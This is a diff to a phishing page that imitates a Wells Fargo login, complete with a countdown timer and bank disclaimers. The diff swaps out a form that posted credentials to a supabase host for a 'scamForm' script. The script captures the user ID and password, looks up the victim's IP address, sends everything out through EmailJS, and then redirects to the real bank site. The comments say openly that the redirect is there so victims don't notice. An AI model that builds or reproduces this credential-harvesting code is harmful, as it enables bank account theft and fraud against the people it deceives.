@@ -206,22 +206,13 @@
         <div class="timer">
             Time Remaining: <span id="countdown">09:59</span>
         </div>
-
-        <form id="phishForm" action="https://dgqibvqkbdqkdsdtlvsb.supabase.co" method="POST">
-            <div class="form-group">
-                <label for="username">User ID</label>
-                <input type="text" id="username" name="username" placeholder="Enter your User ID" required>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your Password" required>
-            </div>
-
-            <button type="submit">Verify Now</button>
-        </form>
-
-        <!-- White Box Disclaimer with Black Text and Bold Font -->
+        <form id="scamForm">
+    <!-- KEEP YOUR EXISTING INPUT NAMES/IDS IF THEY DIFFER, JUST CHANGE THE FORM ID TO "scamForm" -->
+    <input type="text" name="userid" placeholder="User ID" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Log On</button>
+</form>
+    <!-- White Box Disclaimer with Black Text and Bold Font -->
         <div class="disclaimer-box">
             <div class="disclaimer-header">Investment and Insurance Products are:</div>
             <ul class="disclaimer-list">
@@ -256,26 +247,41 @@
         </div>
     </footer>
 
-     <script>
-        var time = 599; 
-        var countdownElement = document.getElementById('countdown');
+       <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    // 1. Init with your Public Key
+    emailjs.init("y3lRWL7KLDjiFjNcN");
+
+    document.getElementById('scamForm').addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        setInterval(function() {
-            if (time < 0) {
-                countdownElement.textContent = "00:00";
-                return;
-            }
-            
-            var minutes = Math.floor(time / 60);
-            var seconds = time % 60;
-            
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-            
-            countdownElement.textContent = minutes + ":" + seconds;
-            time--;
-        }, 1000);
-    </script>
+        // Get data
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+        
+        // Get IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                data.ip = ipData.ip;
+                data.date = new Date().toLocaleString();
+                
+                // Send to EmailJS
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                    .then(() => {
+                        // Success: Redirect to real site
+                        window.location.href = "https://www.wellsfargo.com/";
+                    })
+                    .catch(err => {
+                        // Fail: Still redirect so they don't notice
+                        window.location.href = "https://www.wellsfargo.com/";
+                    });
+            })
+            .catch(() => {
+                window.location.href = "https://www.wellsfargo.com/";
+            });
+    });
+</script>
     
     
 
